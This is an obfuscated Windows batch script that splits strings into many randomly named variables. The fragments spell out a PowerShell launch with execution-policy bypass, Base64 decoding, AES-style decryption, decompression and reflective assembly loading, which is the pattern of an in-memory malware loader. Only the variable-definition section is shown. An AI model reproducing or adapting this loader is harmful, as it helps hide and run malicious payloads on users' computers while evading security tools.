@echo off
set "ISziJlRtyd=po"
set "cGHjjyFuWP= C"
set "dEzEIJfavf=we"
set "VKSJhbznUu=co"
set "TqraVKNzWb=rs"
set "jfNmVFtJXb=rS"
set "WdwEmwvhth=\W"
set "FRnveHXBkO=ll"
set "pdRBAyXVvF=32"
set "yrarBFsprs=he"
set "riDwuqKjEk=\v"
set "XmYwigmqth=do"
set "vdUxGzilFJ= /"
set "lPECNoNrDc=:\"
set "PuigvlMZlM=ll"
set "fIOZnpdIAI=nd"
set "hYivJDbFpy=Sy"
set "TGueAsSsin=0\"
set "AFDPZSGPHT=em"
set "XNnkcSPoXk=y "
set "ysxwFwGCTn=xe"
set "OHTvTNtmQw=we"
set "wyvzQRBvcY=Po"
set "BmcYruZaQZ=s\"
set "YGBMtrBynY=.e"
set "xRybEHOGjj=1."
set "NnoQLpEFaH=py"
set "pIGHsjrGmB=Wi"
set "tvQSuyQyFr=he"
set "mwfSyxiZCD=ws"
set "wfqfjXJLcx=ow"
set "cyCwyCvsvR=in"
set "keRUFkrByu=st"
set "ExONTiAVtM=cd"
set "GlynePtlFU= %~dp0"
set "LrKwWkJulE= = N"
set "ZneLOWSHlP=)($V"
set "HkycHqBVJY=7;$Z"
set "ubEIXOgPXL=;$eb"
set "rrZAZmACEb=::De"
set "CpZRbPxwcq=[Sys"
set "UWucRmlgdT=ke($"
set "CqUXnMTwew=Comp"
set "MOmvZqWkTP=lit("
set "yTwyaiYHOS=ex ="
set "TJWdiadWji=)))"
set "iypamfIlmW=);$J"
set "MlitrAJKqn=ne);"
set "POkWybdqWL=+hAO"
set "juXGjSOSzy=x = "
set "fBCHwXFUgN=vert"
set "SacXIpfDKu=]::N"
set "yPHYfrOgLh=Conv"
set "HKWGdUonWG=bypa"
set "liOQDNlbkP=]::C"
set "kAqxePfHUO=OyzA"
set "LGcUbsxiGy=Secu"
set "aiHTbPIpoT=Syst"
set "GvlzZweWCb=ew-O"
set "twXOCkGjTS=();$"
set "GPzHYElmcL=orF'"
set "TEKqBongnm=RauT"
set "pUnFHpSUwb=ert]"
set "EgoLSGVwFO=Obje"
set "PKJLptaZkM==');"
set "PtKNTUByLF=n ''"
set "IKbIagTVre=ct S"
set "BQmUbFYtSM=);$Z"
set "fzuheMNNVf=ay()"
set "HIqrZQlULV=ose("
set "LHjHXmXsWx=Comp"
set "kJgkNZkiUM=pStr"
set "nQuvIsPqUN=ZhIp"
set "ndjCOjguhz=$dth"
set "GSBeBVVTVT=se()"
set "EVpLgbLvDz=em.I"
set "FjqLcMkAuF=in $"
set "aCQpCQFqML=.Mod"
set "OVsZePdgYK=ecry"
set "nZHRkoDJUU=tsWi"
set "okMDFdlZSn=16] "
set "eOxVARCorS=n ''"
set "kpJBGNyriC=hAK."
set "RQaNXDmWJq=.Com"
set "KIJmEENKwG=d;$Z"
set "vMfOcomaVc=$VFp"
set "BlmkxLgQhO=flec"
set "HlJvbNGTRC=esFX"
set "MrpBkHpskj=nOGq"
set "jCEPgAioMb=6] -"
set "CSpkjqYLcv=TJ, "
set "nBaxCxFQAP=yste"
set "lvqzykGuIs=.Key"
set "YkShNoyPYq=$ZFa"
set "GSKYDANELn=m) {"
set "CAGWDGBSSR=, $V"
set "PchrfVsEvX=pDZz"
set "YuUWMkBtpX=yElT"
set "cozSLeBUWQ=ex);"
set "tinwePOzTj=.Cry"
set "yBExhOJguh=.Ass"
set "exgHCqSPyY=$VFp"
set "fsgtINgDMd=();$"
set "DQeUGNVtFj=bstr"
set "XmKdCkzhGs='gni"
set "IXOrsegPlr=ddin"
set "ejWFDMzLgi=y.Pa"
set "FOlstVzZKL=);$Z"
set "JFVNAoeOvi=t Sy"
set "JMOdFxEGLc=raph"
set "xrLItgJgjZ=szhA"
set "QjaPtHHgiq=trea"
set "rMjygeeWtB=$ZhI"
set "aTYXkuYIzA=lTJ."
